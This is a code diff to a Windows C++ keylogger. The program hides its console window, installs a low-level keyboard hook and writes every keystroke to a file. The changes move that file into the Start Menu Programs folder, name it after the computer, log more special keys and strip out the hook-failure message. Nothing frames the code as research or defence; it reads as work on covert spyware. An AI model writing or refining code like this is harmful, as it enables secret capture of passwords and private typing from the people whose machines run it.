@@ -6,9 +6,20 @@
 using namespace std;
 
 HHOOK keyboardHook;
-ofstream log("log.txt", ios::app);
 map<int, bool> keyStates; // Track key states to prevent repeats
 int cnt = 0;
+
+string getDeviceName() {
+    char computerName[100];
+    DWORD size = 101;
+    if (GetComputerNameA(computerName, &size)) {
+        return string(computerName);
+    }
+    return "unknown_device";
+}
+
+string logFilePath = "C:\\Users\\PCM\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\" + getDeviceName() + ".log";
+ofstream log(logFilePath, ios::app);
 
 LRESULT CALLBACK KeyboardProc(int nCode, WPARAM wParam, LPARAM lParam) {
     if (nCode >= 0) {
@@ -27,14 +38,17 @@ LRESULT CALLBACK KeyboardProc(int nCode, WPARAM wParam, LPARAM lParam) {
                     case VK_BACK: log << "[Backspace]"; break;
                     case VK_TAB: log << "[Tab]"; break;
                     case VK_ESCAPE: log << "[Esc]"; break;
-                    case VK_SHIFT: log << "[Shift]"; break;
+                    case 160: log << "[Shift]"; break;
+                    case 20: log << "[Caps]"; break;
                     // case VK_LMENU: log << "[LAlt Pressed]"; break;
                     case VK_RMENU: log << "[RAlt Pressed]"; break;
-                    case VK_RETURN: log << "\n"; break;
+                    case VK_RETURN: log << "[Enter]"; break;
                     case VK_LEFT: log << "[Left]"; break;
                     case VK_UP: log << "[Up]"; break;
                     case VK_RIGHT: log << "[Right]"; break;
                     case VK_DOWN: log << "[Down]"; break;
+                    case 91: log << "[Win]"; break;
+                    case 46: log << "[Del]"; break;
 
                     case VK_LCONTROL:
                         log << "[L-Ctrl Pressed]";
@@ -73,7 +87,7 @@ LRESULT CALLBACK KeyboardProc(int nCode, WPARAM wParam, LPARAM lParam) {
 
             log.flush();
         }
-        if (cnt == 100) {
+        if (cnt == 30) {
             log << '\n';
         }
     }
@@ -86,10 +100,6 @@ int main() {
     ShowWindow(GetConsoleWindow(), SW_HIDE);
 
     keyboardHook = SetWindowsHookEx(WH_KEYBOARD_LL, KeyboardProc, GetModuleHandle(NULL), 0);
-    if (!keyboardHook) {
-        cout << "Failed to install hook!" << endl;
-        return 1;
-    }
 
     MSG msg;
     while (GetMessage(&msg, NULL, 0, 0)) {
